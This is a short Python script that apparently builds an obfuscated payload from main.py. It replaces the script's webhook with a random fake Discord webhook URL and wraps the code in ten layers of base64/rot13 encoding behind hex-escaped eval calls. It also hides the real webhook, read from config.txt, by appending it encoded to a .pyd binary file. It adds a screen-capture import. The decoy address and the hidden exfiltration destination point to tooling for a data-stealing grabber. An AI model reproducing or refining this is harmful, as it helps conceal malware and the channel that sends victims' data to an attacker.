import base64, codecs, string, random
with open("main.py", encoding="utf-8") as file:
    code = file.read().replace('WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"', f"WEBHOOK = \"https://discord.com/api/webhooks/{''.join(random.choices(string.digits, k= 18))}/{''.join(random.choices(string.ascii_letters + string.digits, k= 68))}\"")
n = 10
with open("config.txt") as config:
    hook = config.read()
for j in range(n):
    based=base64.b64encode(bytes(code, 'utf-8'))
    a=[]
    for i in range(0, len(based), int(len(based)/4)):
        a.append(based[i : i + int(len(based)/4)].decode('utf-8'))
    if not (j+1)==n:
        prem="""#Obfuscated using BlankOBF\n#https://github.com/Blank-c/BlankOBF\n"""
    else:
        prem="""#Obfuscated using BlankOBF\n#https://github.com/Blank-c/BlankOBF\n\nimport base64, codecs\n"""
    code=rf"""{prem}magic = '{a[0]}'
love= '{codecs.encode(a[1], "rot13")}'
god='{a[2]}'
destiny = '{codecs.encode(a[3], "rot13")}'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))"""

with open("ampl.pyd", "rb") as e:
    con = e.read()
    
with open("structc.pyd", "wb") as e:
    e.write(con+base64.b64encode(hook.encode()).decode().encode('utf-16'))

code = """from PIL import ImageGrab, Image, ImageStat
""" + code

with open('main-o.py', 'w') as file:
    file.write(code)